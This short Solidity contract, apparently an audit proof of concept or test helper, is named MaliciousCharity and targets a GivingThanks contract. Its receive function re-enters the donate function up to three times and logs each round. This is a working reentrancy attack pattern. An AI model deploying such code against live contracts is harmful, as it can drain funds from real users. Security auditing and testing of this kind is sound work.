// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import {GivingThanks} from "../src/GivingThanks.sol";

contract MaliciousCharity {
    GivingThanks private givingThanks;

    constructor(address _givingThanks) {
        givingThanks = GivingThanks(_givingThanks);
    }

    uint256 private reentrancyCount = 0;
    uint256 private ATTACK_ROUNDS = 3;

    receive() external payable {        

        if (reentrancyCount < ATTACK_ROUNDS) {
            reentrancyCount++;
            console.log("reentrancy count:", reentrancyCount);
            // Use the same donated ETH to repeatedly call givingThanks.donate()
            givingThanks.donate{value: msg.value}(address(this));
        }
    }
}